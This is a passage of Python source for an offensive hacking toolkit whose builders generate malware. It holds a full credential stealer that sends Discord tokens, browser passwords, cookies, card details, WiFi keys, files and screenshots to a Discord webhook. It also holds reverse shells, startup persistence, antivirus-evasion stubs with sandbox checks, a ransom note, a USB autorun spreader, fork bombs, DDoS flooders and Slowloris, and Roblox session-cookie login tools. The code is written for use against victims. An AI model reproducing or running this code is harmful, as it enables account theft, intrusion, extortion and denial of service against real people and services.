    print(f"\n{OK} Built -> {Y}1-Output/restart_loop.py{RST}"); pause()

def builder_stealer():
    banner_s("FULL STEALER BUILDER")
    webhook=input(f"  {W}Discord Webhook URL: {RST}").strip()
    out_name=input(f"  {W}Output filename (e.g. stealer.py): {RST}").strip() or "stealer.py"
    code='''# -*- coding: utf-8 -*-
#!/usr/bin/env python3
# Tiger Stealer v4 -- Full Grab
import os,json,sqlite3,shutil,platform,socket,subprocess,base64,re,time
from datetime import datetime

WEBHOOK="'''+webhook+'''"

def _req():
    try: import requests; return requests
    except:
        import subprocess as sp; sp.run(["pip","install","requests","--quiet"],check=False)
        import requests; return requests
req=_req()

def send(content="",embeds=None,files=None):
    try:
        data={"content":content}
        if embeds: data["embeds"]=embeds
        if files: req.post(WEBHOOK,data=data,files=files,timeout=10)
        else: req.post(WEBHOOK,json=data,timeout=10)
    except: pass

def sysinfo():
    try: pub=req.get("https://api.ipify.org",timeout=4).text.strip()
    except: pub="?"
    try: h=socket.gethostname(); loc=socket.gethostbyname(h)
    except: h=loc="?"
    return {"hostname":h,"local_ip":loc,"public_ip":pub,
            "user":os.getlogin(),"os":platform.platform(),
            "cpu":platform.processor(),"datetime":str(datetime.now())[:19]}

def discord_tokens():
    appdata=os.environ.get("APPDATA",""); local=os.environ.get("LOCALAPPDATA","")
    paths={"Discord":os.path.join(appdata,"Discord","Local Storage","leveldb"),
           "Discord PTB":os.path.join(appdata,"discordptb","Local Storage","leveldb"),
           "Discord Canary":os.path.join(appdata,"discordcanary","Local Storage","leveldb"),
           "Chrome":os.path.join(local,"Google","Chrome","User Data","Default","Local Storage","leveldb"),
           "Edge":os.path.join(local,"Microsoft","Edge","User Data","Default","Local Storage","leveldb"),
           "Brave":os.path.join(local,"BraveSoftware","Brave-Browser","User Data","Default","Local Storage","leveldb"),
           "Opera":os.path.join(appdata,"Opera Software","Opera Stable","Local Storage","leveldb")}
    pattern=re.compile(r"[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}|mfa\\.[\\w-]{84}")
    found=[]
    for name,path in paths.items():
        if not os.path.isdir(path): continue
        for fname in os.listdir(path):
            if not fname.endswith((".log",".ldb")): continue
            try:
                with open(os.path.join(path,fname),"r",errors="ignore") as f:
                    for token in pattern.findall(f.read()):
                        if any(t["token"]==token for t in found): continue
                        r=req.get("https://discord.com/api/v9/users/@me",
                                  headers={"Authorization":token},timeout=3)
                        if r.status_code==200:
                            u=r.json()
                            found.append({"token":token,
                                "username":f"{u.get('username')}#{u.get('discriminator','0')}",
                                "email":u.get("email","N/A"),"phone":u.get("phone","N/A"),
                                "nitro":u.get("premium_type",0),"source":name})
            except: pass
    return found

def passwords():
    results=[]; local=os.environ.get("LOCALAPPDATA","")
    dbs=[os.path.join(local,"Google","Chrome","User Data","Default","Login Data"),
         os.path.join(local,"Google","Chrome","User Data","Profile 1","Login Data"),
         os.path.join(local,"Microsoft","Edge","User Data","Default","Login Data"),
         os.path.join(local,"BraveSoftware","Brave-Browser","User Data","Default","Login Data"),
         os.path.join(local,"Opera Software","Opera Stable","Login Data")]
    for db in dbs:
        if not os.path.isfile(db): continue
        tmp=f"tmp_{abs(hash(db))}.db"
        try:
            shutil.copy2(db,tmp); conn=sqlite3.connect(tmp)
            for url,user,pwd in conn.execute("SELECT origin_url,username_value,password_value FROM logins"):
                if user: results.append({"url":url,"username":user,"password":"(encrypted)"})
            conn.close()
        except: pass
        finally:
            try: os.remove(tmp)
            except: pass
    return results

def credit_cards():
    results=[]; local=os.environ.get("LOCALAPPDATA","")
    dbs=[os.path.join(local,"Google","Chrome","User Data","Default","Web Data"),
         os.path.join(local,"Microsoft","Edge","User Data","Default","Web Data"),
         os.path.join(local,"BraveSoftware","Brave-Browser","User Data","Default","Web Data")]
    for db in dbs:
        if not os.path.isfile(db): continue
        tmp=f"tmp_cc_{abs(hash(db))}.db"
        try:
            shutil.copy2(db,tmp); conn=sqlite3.connect(tmp)
            for row in conn.execute("SELECT name_on_card,expiration_month,expiration_year,card_number_encrypted FROM credit_cards"):
                results.append({"name":row[0],"exp":f"{row[1]}/{row[2]}","number":"(encrypted)"})
            conn.close()
        except: pass
        finally:
            try: os.remove(tmp)
            except: pass
    return results

def cookies():
    results=[]; local=os.environ.get("LOCALAPPDATA","")
    targets=["discord","steam","roblox","paypal","amazon","gmail","facebook","instagram","twitter","tiktok","minecraft","epicgames","riot"]
    dbs=[os.path.join(local,"Google","Chrome","User Data","Default","Network","Cookies"),
         os.path.join(local,"Google","Chrome","User Data","Default","Cookies"),
         os.path.join(local,"Microsoft","Edge","User Data","Default","Network","Cookies"),
         os.path.join(local,"BraveSoftware","Brave-Browser","User Data","Default","Network","Cookies")]
    for db in dbs:
        if not os.path.isfile(db): continue
        tmp=f"tmp_ck_{abs(hash(db))}.db"
        try:
            shutil.copy2(db,tmp); conn=sqlite3.connect(tmp)
            for host,name,path_,val,exp in conn.execute("SELECT host_key,name,path,encrypted_value,expires_utc FROM cookies"):
                if any(t in str(host).lower() for t in targets):
                    results.append({"host":host,"name":name,"path":path_})
            conn.close()
        except: pass
        finally:
            try: os.remove(tmp)
            except: pass
    return results[:150]

def browsing_history():
    results=[]; local=os.environ.get("LOCALAPPDATA","")
    dbs=[os.path.join(local,"Google","Chrome","User Data","Default","History"),
         os.path.join(local,"Microsoft","Edge","User Data","Default","History")]
    for db in dbs:
        if not os.path.isfile(db): continue
        tmp=f"tmp_hist_{abs(hash(db))}.db"
        try:
            shutil.copy2(db,tmp); conn=sqlite3.connect(tmp)
            for url,title,visit_count in conn.execute("SELECT url,title,visit_count FROM urls ORDER BY visit_count DESC LIMIT 100"):
                results.append({"url":url,"title":title,"visits":visit_count})
            conn.close()
        except: pass
        finally:
            try: os.remove(tmp)
            except: pass
    return results

def download_history():
    results=[]; local=os.environ.get("LOCALAPPDATA","")
    dbs=[os.path.join(local,"Google","Chrome","User Data","Default","History"),
         os.path.join(local,"Microsoft","Edge","User Data","Default","History")]
    for db in dbs:
        if not os.path.isfile(db): continue
        tmp=f"tmp_dl_{abs(hash(db))}.db"
        try:
            shutil.copy2(db,tmp); conn=sqlite3.connect(tmp)
            for url,target in conn.execute("SELECT tab_url,target_path FROM downloads LIMIT 50"):
                results.append({"url":url,"path":target})
            conn.close()
        except: pass
        finally:
            try: os.remove(tmp)
            except: pass
    return results

def crypto_wallets():
    results=[]; appdata=os.environ.get("APPDATA",""); local=os.environ.get("LOCALAPPDATA","")
    wallets={
        "Electrum":os.path.join(appdata,"Electrum","wallets"),
        "Exodus":os.path.join(appdata,"Exodus","exodus.wallet"),
        "Atomic":os.path.join(appdata,"atomic","Local Storage","leveldb"),
        "Coinomi":os.path.join(local,"Coinomi","Coinomi","wallets"),
        "Guarda":os.path.join(appdata,"Guarda","Local Storage","leveldb"),
        "Jaxx":os.path.join(appdata,"jaxx","Local Storage","leveldb"),
    }
    for name,path in wallets.items():
        if os.path.exists(path):
            results.append(f"[FOUND] {name}: {path}")
    return results

def game_sessions():
    results=[]; local=os.environ.get("LOCALAPPDATA",""); appdata=os.environ.get("APPDATA","")
    games={"Steam":os.path.join(local,"Steam","config","loginusers.vdf"),
           "Epic Games":os.path.join(local,"EpicGamesLauncher","Saved","Config","Windows","GameUserSettings.ini"),
           "Riot":os.path.join(local,"Riot Games","Riot Client","Data","RiotClientPrivateSettings.yaml"),
           "Rockstar":os.path.join(os.environ.get("APPDATA",""),"Rockstar Games","Launcher","rsg-launcher.cfg")}
    for name,path in games.items():
        if os.path.isfile(path):
            try:
                with open(path,"r",errors="ignore") as f: content=f.read()[:500]
                results.append({"game":name,"file":path,"preview":content})
            except: results.append({"game":name,"file":path,"preview":"found"})
    return results

def wifi_passwords():
    results=[]
    if platform.system()!="Windows": return results
    try:
        out=subprocess.run(["netsh","wlan","show","profiles"],capture_output=True,text=True).stdout
        profiles=re.findall(r"All User Profile\\s*:\\s*(.+)",out)
        for p in profiles:
            p=p.strip()
            try:
                pw_out=subprocess.run(["netsh","wlan","show","profile",p,"key=clear"],capture_output=True,text=True).stdout
                pw_m=re.search(r"Key Content\\s*:\\s*(.+)",pw_out)
                results.append({"ssid":p,"password":pw_m.group(1).strip() if pw_m else "(none)"})
            except: pass
    except: pass
    return results

def screenshot():
    try:
        from PIL import ImageGrab; img=ImageGrab.grab(); p="_ss.png"; img.save(p); return p
    except: return None

def interesting_files():
    results=[]; home=os.path.expanduser("~")
    extensions=[".txt",".doc",".docx",".pdf",".xls",".xlsx",".csv",".key",".ppk",".pem"]
    keywords=["password","pass","login","secret","key","wallet","seed","mnemonic","backup","private"]
    dirs=[os.path.join(home,"Desktop"),os.path.join(home,"Documents"),os.path.join(home,"Downloads")]
    for d in dirs:
        if not os.path.isdir(d): continue
        for fname in os.listdir(d):
            low=fname.lower()
            if any(low.endswith(e) for e in extensions) and any(k in low for k in keywords):
                results.append(os.path.join(d,fname))
    return results[:20]

def main():
    info=sysinfo(); tokens=discord_tokens(); pwds=passwords()
    cards=credit_cards(); ckies=cookies(); wallets=crypto_wallets()
    games=game_sessions(); wifi=wifi_passwords()
    hist=browsing_history(); dl=download_history()
    interesting=interesting_files()

    tok_str=""
    for t in tokens[:5]:
        tok_str+=f"**{t['username']}** | {t.get('email','?')} | Nitro:{t.get('nitro',0)}\\n`{t['token']}`\\n"

    embed={"title":"Tiger Stealer v4 -- New Victim","color":0xFF0000,"fields":[
        {"name":"System","value":f"```{json.dumps(info,indent=2)[:900]}```","inline":False},
        {"name":"Discord Tokens","value":(tok_str[:1000] if tok_str else "None"),"inline":False},
        {"name":"Passwords","value":f"**{len(pwds)}** entries","inline":True},
        {"name":"Credit Cards","value":f"**{len(cards)}** entries","inline":True},
        {"name":"Cookies","value":f"**{len(ckies)}** target cookies","inline":True},
        {"name":"Crypto Wallets","value":f"**{len(wallets)}** found","inline":True},
        {"name":"Game Sessions","value":f"**{len(games)}** found","inline":True},
        {"name":"WiFi","value":f"**{len(wifi)}** networks","inline":True},
        {"name":"Browse History","value":f"**{len(hist)}** entries","inline":True},
        {"name":"Downloads","value":f"**{len(dl)}** entries","inline":True},
        {"name":"Interesting Files","value":f"**{len(interesting)}** found","inline":True},
    ],"footer":{"text":f"Tiger Stealer v4 | {info.get('datetime','')}"}}
    send(embeds=[embed])

    if pwds:
        txt="\\n".join(f"{p['url']} | {p['username']}" for p in pwds[:100])
        send(content="Passwords:",files={"file":("passwords.txt",txt.encode())})
    if cards:
        txt="\\n".join(f"{c['name']} | {c['exp']}" for c in cards)
        send(content="Credit Cards:",files={"file":("cards.txt",txt.encode())})
    if wifi:
        txt="\\n".join(f"{w['ssid']} | {w['password']}" for w in wifi)
        send(content="WiFi:",files={"file":("wifi.txt",txt.encode())})
    if ckies:
        txt="\\n".join(f"{c['host']} | {c['name']}" for c in ckies)
        send(content="Cookies:",files={"file":("cookies.txt",txt.encode())})
    if hist:
        txt="\\n".join(f"{h['url']} | {h['title']}" for h in hist[:50])
        send(content="Browsing History:",files={"file":("history.txt",txt.encode())})
    if wallets:
        send(content="Crypto Wallets:\\n"+"\\n".join(wallets))
    if games:
        txt="\\n".join(f"{g['game']}: {g['file']}" for g in games)
        send(content="Game Sessions:",files={"file":("games.txt",txt.encode())})
    if interesting:
        for fpath in interesting[:5]:
            try:
                with open(fpath,"rb") as f2:
                    send(content=f"Interesting: {os.path.basename(fpath)}",
                         files={"file":(os.path.basename(fpath),f2.read())})
            except: pass
    ss=screenshot()
    if ss and os.path.isfile(ss):
        with open(ss,"rb") as f: send(content="Screenshot:",files={"file":("screenshot.png",f.read())})
        try: os.remove(ss)
        except: pass

if __name__=="__main__": main()
'''
    os.makedirs("1-Output",exist_ok=True)
    path=os.path.join("1-Output",out_name)
    with open(path,"w",encoding="utf-8") as f: f.write(code)
    print(f"\n{OK} Stealer -> {Y}{path}{RST}")
    print(f"  {DIM}Grabs: Discord tokens / passwords / cards / cookies / wallets / games / WiFi / history / screenshot / interesting files{RST}")
    builder_ask_format(path)
    pause()

def builder_fake_error():
    banner_s("FAKE ERROR")
    title=input(f"  {W}Title: {RST}").strip() or "System Error"
    msg=input(f"  {W}Message: {RST}").strip() or "A critical error has occurred."
    icons={"0":"0x10","1":"0x20","2":"0x30","3":"0x40"}
    ico=icons.get(input(f"  {W}Icon 0=stop 1=? 2=warn 3=info: {RST}").strip(),"0x10")
    code=f'import ctypes\nctypes.windll.user32.MessageBoxW(0,"{msg}","{title}",{ico})\n'
    os.makedirs("1-Output",exist_ok=True)
    with open("1-Output/fake_error.py","w",encoding="utf-8") as f: f.write(code)
    print(f"\n{OK} Built -> {Y}1-Output/fake_error.py{RST}"); pause()

def builder_ask_format(py_path):
    """After building a .py, offer to compile to .exe"""
    if not os.path.isfile(py_path):
        return
    fmt = input(f"\n  {W}Format: {Y}[1]{RST}{W} garder .py  {Y}[2]{RST}{W} compiler en .exe: {RST}").strip()
    if fmt == "2":
        try:
            import PyInstaller
        except ImportError:
            print(f"\n{INF} Installation de PyInstaller...")
            subprocess.run([sys.executable,"-m","pip","install","pyinstaller","--quiet"],check=False)
        print(f"\n{INF} Compilation en cours...")
        result = subprocess.run(
            [sys.executable,"-m","PyInstaller","--onefile","--noconsole",
             "--distpath","1-Output","--workpath","1-Output/build_tmp",
             "--specpath","1-Output/build_tmp", py_path],
            capture_output=True, text=True
        )
        if result.returncode == 0:
            name = os.path.splitext(os.path.basename(py_path))[0]
            print(f"\n{OK} .exe compile -> {G}1-Output/{name}.exe{RST}")
        else:
            print(f"\n{ERR} Erreur compilation:\n{result.stderr[-500:]}")

def builder_startup():
    banner_s("STARTUP PERSISTENCE")
    script=input(f"  {W}Script path: {RST}").strip()
    code=f'''import os,shutil,winreg
SCRIPT=r"{script}"
STARTUP=os.path.join(os.environ.get("APPDATA",""),"Microsoft","Windows","Start Menu","Programs","Startup")
try: shutil.copy2(SCRIPT,STARTUP); print("[+] Startup folder OK")
except Exception as e: print(f"[-] {{e}}")
try:
    k=winreg.OpenKey(winreg.HKEY_CURRENT_USER,r"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run",0,winreg.KEY_SET_VALUE)
    winreg.SetValueEx(k,"TigerRun",0,winreg.REG_SZ,f"python \\"{SCRIPT}\\"")
    winreg.CloseKey(k); print("[+] Registry OK")
except Exception as e: print(f"[-] {{e}}")
'''
    os.makedirs("1-Output",exist_ok=True)
    with open("1-Output/startup.py","w",encoding="utf-8") as f: f.write(code)
    print(f"\n{OK} Built -> {Y}1-Output/startup.py{RST}"); pause()

def builder_forkbomb():
    banner_s("FORK BOMB")
    print(f"  {Y}[1]{RST} Python  {Y}[2]{RST} Batch  {Y}[3]{RST} Bash")
    c=input(f"  {W}Choice: {RST}").strip()
    os.makedirs("1-Output",exist_ok=True)
    if c=="1":
        with open("1-Output/forkbomb.py","w",encoding="utf-8") as f: f.write("import os\nwhile True: os.fork()\n")
    elif c=="2":
        with open("1-Output/forkbomb.bat","w",encoding="utf-8") as f: f.write(":loop\nstart %0\ngoto loop\n")
    elif c=="3":
        with open("1-Output/forkbomb.sh","w",encoding="utf-8") as f: f.write(":(){ :|:& };:\n")
    print(f"\n{OK} Built in 1-Output/"); pause()

def builder_revshell():
    banner_s("REVERSE SHELL")
    host=input(f"  {W}LHOST: {RST}").strip(); port=input(f"  {W}LPORT: {RST}").strip() or "4444"
    print(f"  {Y}[1]{RST} Python  {Y}[2]{RST} PowerShell  {Y}[3]{RST} Bash")
    c=input(f"  {W}Type: {RST}").strip()
    os.makedirs("1-Output",exist_ok=True)
    if c=="1":
        code=f'''import socket,subprocess
s=socket.socket(); s.connect(("{host}",{port}))
while True:
    cmd=s.recv(1024).decode()
    if not cmd.strip(): continue
    out=subprocess.run(cmd,shell=True,capture_output=True)
    s.send(out.stdout+out.stderr)
'''
        with open("1-Output/revshell.py","w",encoding="utf-8") as f: f.write(code)
        print(f"\n{OK} {Y}1-Output/revshell.py{RST}\n  {DIM}Listener: nc -lvnp {port}{RST}")
        builder_ask_format("1-Output/revshell.py")
    elif c=="2":
        ps=(f"$c=New-Object System.Net.Sockets.TCPClient('{host}',{port});"
            "$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};"
            "while(($i=$s.Read($b,0,$b.Length))-ne 0){{"
            "$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
            "$r=(iex $d 2>&1|Out-String);$rb=$r+'PS '+(pwd).Path+'> ';"
            "$sb=([text.encoding]::ASCII).GetBytes($rb);$s.Write($sb,0,$sb.Length);$s.Flush()}};$c.Close()")
        with open("1-Output/revshell.ps1","w",encoding="utf-8") as f: f.write(ps)
        print(f"\n{OK} {Y}1-Output/revshell.ps1{RST}")
    elif c=="3":
        with open("1-Output/revshell.sh","w",encoding="utf-8") as f: f.write(f"bash -i >& /dev/tcp/{host}/{port} 0>&1\n")
        print(f"\n{OK} {Y}1-Output/revshell.sh{RST}")
    pause()

def builder_av_bypass():
    banner_s("AV BYPASS STUB")
    payload=input(f"  {W}Payload .py path: {RST}").strip()
    out=input(f"  {W}Output name: {RST}").strip() or "stub.py"
    print(f"  {Y}[1]{RST} XOR  {Y}[2]{RST} Base64  {Y}[3]{RST} Delay+EnvCheck  {Y}[4]{RST} All combined")
    method=input(f"  {W}Method: {RST}").strip()
    os.makedirs("1-Output",exist_ok=True)
    if not os.path.isfile(payload): print(f"{ERR} File not found."); pause(); return
    with open(payload,"r",encoding="utf-8",errors="ignore") as f: src=f.read()
    key=random.randint(1,254)
    enc_xor=base64.b64encode(bytes(b^key for b in src.encode())).decode()
    enc_b64=base64.b64encode(src.encode()).decode()
    if method=="1":
        stub=f'import base64\n_k={key}\n_d=base64.b64decode("{enc_xor}")\nexec(bytes(b^_k for b in _d).decode())\n'
    elif method=="2":
        stub=f'import base64\nexec(base64.b64decode("{enc_b64}").decode())\n'
    elif method=="3":
        stub=f'''import base64,time,os,platform
if os.environ.get("COMPUTERNAME","").lower() in ["sandbox","virus","malware","test","cuckoo"]: exit()
if platform.processor()=="": exit()
if os.path.isfile(r"C:\\\\analysis\\\\agent.py"): exit()
time.sleep(15)
exec(base64.b64decode("{enc_b64}").decode())
'''
    elif method=="4":
        stub=f'''import base64,time,os,platform
if os.environ.get("COMPUTERNAME","").lower() in ["sandbox","virus","malware","test","cuckoo"]: exit()
if platform.processor()=="": exit()
if os.path.isfile(r"C:\\\\analysis\\\\agent.py"): exit()
time.sleep(12)
_k={key}
_d=base64.b64decode("{enc_xor}")
exec(bytes(b^_k for b in _d).decode())
'''
    else: print(f"{ERR} Invalid."); pause(); return
    path=os.path.join("1-Output",out)
    with open(path,"w",encoding="utf-8") as f: f.write(stub)
    print(f"\n{OK} Stub -> {Y}{path}{RST}"); pause()

def builder_ransom_note():
    banner_s("RANSOMWARE NOTE")
    title=input(f"  {W}Title: {RST}").strip() or "YOUR FILES HAVE BEEN ENCRYPTED"
    contact=input(f"  {W}Contact: {RST}").strip() or "contact@example.com"
    amount=input(f"  {W}Amount (e.g. 0.05 BTC): {RST}").strip() or "0.05 BTC"
    deadline=input(f"  {W}Deadline: {RST}").strip() or "72 hours"
    uid=hashlib.md5(os.urandom(16)).hexdigest().upper()
    note=f"""
+========================================================+
|      !!!  {title}  !!!      |
+========================================================+

All your important files have been encrypted by Tiger.

To decrypt your files you must pay {amount} within {deadline}.

Contact: {contact}

DO NOT:
  - Rename or modify encrypted files
  - Use third-party decryption tools
  - Contact law enforcement

Your files will be permanently deleted after the deadline.

Unique ID: {uid}

=========================================================
"""
    os.makedirs("1-Output",exist_ok=True)
    with open("1-Output/README_DECRYPT.txt","w",encoding="utf-8") as f: f.write(note)
    print(f"\n{OK} Note -> {Y}1-Output/README_DECRYPT.txt{RST}"); print(note); pause()

def builder_usb_spreader():
    banner_s("USB SPREADER")
    payload=input(f"  {W}Payload filename: {RST}").strip() or "stealer.py"
    code=f'''import os,shutil,string

PAYLOAD=r"{payload}"

def get_drives():
    drives=[]
    for letter in string.ascii_uppercase:
        drive=f"{{letter}}:\\\\"
        if os.path.exists(drive) and drive!=os.path.splitdrive(os.getcwd())[0]+"\\\\":
            drives.append(drive)
    return drives

def spread():
    if not os.path.isfile(PAYLOAD):
        print(f"[-] Payload not found: {{PAYLOAD}}"); return
    for drive in get_drives():
        try:
            dest=os.path.join(drive,os.path.basename(PAYLOAD))
            shutil.copy2(PAYLOAD,dest)
            with open(os.path.join(drive,"autorun.inf"),"w") as f:
                f.write(f"[AutoRun]\\nopen=python {{os.path.basename(PAYLOAD)}}\\nicon=shell32.dll,4\\n")
            print(f"[+] Spread to {{drive}}")
        except Exception as e: print(f"[-] {{drive}}: {{e}}")

if __name__=="__main__": spread()
'''
    os.makedirs("1-Output",exist_ok=True)
    with open("1-Output/usb_spreader.py","w",encoding="utf-8") as f: f.write(code)
    print(f"\n{OK} Built -> {Y}1-Output/usb_spreader.py{RST}"); pause()

# ================================================================
# 6 - DDOS (Layer 4)
# ================================================================
def ddos_menu():
    while True:
        opts=[("1","UDP Flood (Layer 4)"),("2","TCP SYN Flood (Layer 4)"),
              ("3","HTTP GET Flood (Layer 7)"),("4","Slowloris"),
              ("5","Multi-threaded UDP Flood"),("0","Back")]
        menu_box("DDOS / STRESSER",opts)
        c=input(f"  {R}>{RST} ").strip()
        if c=="1": ddos_udp()
        elif c=="2": ddos_tcp()
        elif c=="3": ddos_http()
        elif c=="4": ddos_slowloris()
        elif c=="5": ddos_udp_threaded()
        elif c=="0": break

def ddos_udp():
    banner_s("UDP FLOOD -- Layer 4")
    host=input(f"  {W}Target IP: {RST}").strip()
    port=int(input(f"  {W}Port: {RST}").strip() or "80")
    duration=int(input(f"  {W}Duration (seconds): {RST}").strip() or "10")
    payload=random._urandom(1024)
    print(f"\n{INF} UDP flood -> {Y}{host}:{port}{RST} for {duration}s...\n")
    sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
    end=time.time()+duration; sent=0
    try:
        while time.time()<end:
            sock.sendto(payload,(host,port)); sent+=1
            if sent%1000==0: print(f"  {G}[~]{RST} {sent} packets sent")
    except KeyboardInterrupt: pass
    finally: sock.close()
    print(f"\n{OK} Done. {sent} packets sent."); pause()

def ddos_tcp():
    banner_s("TCP SYN FLOOD -- Layer 4")
    host=input(f"  {W}Target IP: {RST}").strip()
    port=int(input(f"  {W}Port: {RST}").strip() or "80")
    duration=int(input(f"  {W}Duration (seconds): {RST}").strip() or "10")
    print(f"\n{INF} TCP flood -> {Y}{host}:{port}{RST} for {duration}s...\n")
    end=time.time()+duration; sent=0
    try:
        while time.time()<end:
            try:
                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.settimeout(0.1)
                s.connect_ex((host,port)); s.close(); sent+=1
                if sent%100==0: print(f"  {G}[~]{RST} {sent} connections attempted")
            except: pass
    except KeyboardInterrupt: pass
    print(f"\n{OK} Done. {sent} attempts."); pause()

def ddos_http():
    banner_s("HTTP GET FLOOD -- Layer 7")
    url=input(f"  {W}Target URL: {RST}").strip()
    duration=int(input(f"  {W}Duration (seconds): {RST}").strip() or "10")
    threads_n=int(input(f"  {W}Threads: {RST}").strip() or "50")
    print(f"\n{INF} HTTP flood -> {Y}{url}{RST} for {duration}s with {threads_n} threads...\n")
    stop={"v":False}; sent_total=[0]
    def flood():
        ua_list=["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/537.36",
                 "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"]
        while not stop["v"]:
            try:
                ua=random.choice(ua_list)
                requests.get(url,headers={"User-Agent":ua},timeout=2)
                sent_total[0]+=1
            except: pass
    threads_list=[threading.Thread(target=flood,daemon=True) for _ in range(threads_n)]
    for t in threads_list: t.start()
    try:
        end=time.time()+duration
        while time.time()<end:
            print(f"\r  {G}[~]{RST} {sent_total[0]} requests sent",end=""); time.sleep(0.5)
    except KeyboardInterrupt: pass
    stop["v"]=True; print(f"\n\n{OK} Done. {sent_total[0]} requests."); pause()

def ddos_slowloris():
    banner_s("SLOWLORIS")
    host=input(f"  {W}Target host: {RST}").strip()
    port=int(input(f"  {W}Port: {RST}").strip() or "80")
    sockets_n=int(input(f"  {W}Sockets count: {RST}").strip() or "150")
    duration=int(input(f"  {W}Duration (seconds): {RST}").strip() or "30")
    print(f"\n{INF} Slowloris -> {Y}{host}:{port}{RST} | {sockets_n} sockets | {duration}s...\n")
    socks=[]
    def init_socket():
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.settimeout(4); s.connect((host,port))
        s.send(f"GET /?{random.randint(0,9999)} HTTP/1.1\r\n".encode())
        s.send(f"Host: {host}\r\n".encode())
        s.send(b"User-Agent: Mozilla/5.0\r\n")
        s.send(b"Accept-language: en-US,en;q=0.5\r\n")
        return s
    print(f"{INF} Opening {sockets_n} sockets...")
    for _ in range(sockets_n):
        try: socks.append(init_socket())
        except: pass
    print(f"{OK} {len(socks)} sockets open.")
    end=time.time()+duration
    try:
        while time.time()<end:
            print(f"\r  {G}[~]{RST} {len(socks)} sockets alive",end="")
            for s in list(socks):
                try: s.send(f"X-a: {random.randint(1,5000)}\r\n".encode())
                except:
                    socks.remove(s)
                    try: socks.append(init_socket())
                    except: pass
            time.sleep(15)
    except KeyboardInterrupt: pass
    for s in socks:
        try: s.close()
        except: pass
    print(f"\n\n{OK} Slowloris done."); pause()

def ddos_udp_threaded():
    banner_s("MULTI-THREADED UDP FLOOD")
    host=input(f"  {W}Target IP: {RST}").strip()
    port=int(input(f"  {W}Port: {RST}").strip() or "80")
    duration=int(input(f"  {W}Duration (seconds): {RST}").strip() or "10")
    threads_n=int(input(f"  {W}Threads: {RST}").strip() or "10")
    print(f"\n{INF} UDP flood -> {Y}{host}:{port}{RST} | {threads_n} threads | {duration}s...\n")
    stop={"v":False}; sent_total=[0]
    def flood():
        payload=random._urandom(1024)
        sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
        while not stop["v"]:
            try: sock.sendto(payload,(host,port)); sent_total[0]+=1
            except: pass
        sock.close()
    threads_list=[threading.Thread(target=flood,daemon=True) for _ in range(threads_n)]
    for t in threads_list: t.start()
    try:
        end=time.time()+duration
        while time.time()<end:
            print(f"\r  {G}[~]{RST} {sent_total[0]} packets sent",end=""); time.sleep(0.5)
    except KeyboardInterrupt: pass
    stop["v"]=True; print(f"\n\n{OK} Done. {sent_total[0]} packets."); pause()

# ================================================================
# 7 - ROBLOX
# ================================================================
def roblox_menu():
    while True:
        opts=[("1","Cookie Login"),("2","Cookie Info"),
              ("3","User Info by Username"),("4","User Info by ID"),
              ("5","Game Info"),("6","Search Users"),
              ("7","Group Info"),("8","Avatar Info"),("0","Back")]
        menu_box("ROBLOX TOOLS",opts)
        c=input(f"  {R}>{RST} ").strip()
        if c=="1": rblx_cookie_login()
        elif c=="2": rblx_cookie_info()
        elif c=="3": rblx_by_name()
        elif c=="4": rblx_by_id()
        elif c=="5": rblx_game()
        elif c=="6": rblx_search()
        elif c=="7": rblx_group()
        elif c=="8": rblx_avatar()
        elif c=="0": break

def rblx_cookie_login():
    banner_s("ROBLOX COOKIE LOGIN")
    cookie=input(f"  {W}.ROBLOSECURITY: {RST}").strip()
    h={"Cookie":f".ROBLOSECURITY={cookie}"}
    r=requests.get("https://users.roblox.com/v1/users/authenticated",headers=h)
    if r.status_code!=200: print(f"{ERR} Invalid cookie. ({r.status_code})"); pause(); return
    d=r.json(); uid=d.get("id")
    print(f"\n{OK} Logged in as: {G}{d.get('name')}{RST} (ID: {uid})")
    save_out(f"rblx_login_{uid}.txt",f"ID:{uid}\nUsername:{d.get('name')}\nCookie:{cookie}"); pause()

def rblx_cookie_info():
    banner_s("ROBLOX COOKIE INFO")
    cookie=input(f"  {W}.ROBLOSECURITY: {RST}").strip()
    h={"Cookie":f".ROBLOSECURITY={cookie}"}
    r=requests.get("https://users.roblox.com/v1/users/authenticated",headers=h)
    if r.status_code!=200: print(f"{ERR} Invalid cookie. ({r.status_code})"); pause(); return
    d=r.json(); uid=d.get("id")
    robust=requests.get(f"https://economy.roblox.com/v1/users/{uid}/currency",headers=h).json()
    friends=requests.get(f"https://friends.roblox.com/v1/users/{uid}/friends/count",headers=h).json()
    premium=requests.get(f"https://premiumfeatures.roblox.com/v1/users/{uid}/validate-membership",headers=h)
    print(f"\n  {Y}ID      {RST}: {W}{uid}{RST}\n  {Y}Username{RST}: {W}{d.get('name')}{RST}")
    print(f"  {Y}Robux   {RST}: {G}{robust.get('robux','?')}{RST}\n  {Y}Friends {RST}: {W}{friends.get('count','?')}{RST}")
    print(f"  {Y}Premium {RST}: {G if premium.status_code==200 else R}{premium.status_code==200}{RST}")
    save_out(f"rblx_{uid}.txt",json.dumps({"user":d,"robux":robust.get("robux")},indent=2)); pause()

def rblx_by_name():
    banner_s("USER BY USERNAME")
    username=input(f"  {W}Username: {RST}").strip()
    r=requests.post("https://users.roblox.com/v1/usernames/users",
                    json={"usernames":[username],"excludeBannedUsers":False}).json()
    if r.get("data"): _rblx_print_user(r["data"][0]["id"])
    else: print(f"{ERR} Not found.")
    pause()

def rblx_by_id():
    banner_s("USER BY ID")
    uid=input(f"  {W}User ID: {RST}").strip()
    _rblx_print_user(uid); pause()

def _rblx_print_user(uid):
    r=requests.get(f"https://users.roblox.com/v1/users/{uid}").json()
    friends=requests.get(f"https://friends.roblox.com/v1/users/{uid}/friends/count").json()
    followers=requests.get(f"https://friends.roblox.com/v1/users/{uid}/followers/count").json()
    following=requests.get(f"https://friends.roblox.com/v1/users/{uid}/followings/count").json()
    banned=r.get("isBanned",False)
    print(f"\n  {Y}ID          {RST}: {W}{r.get('id')}{RST}")
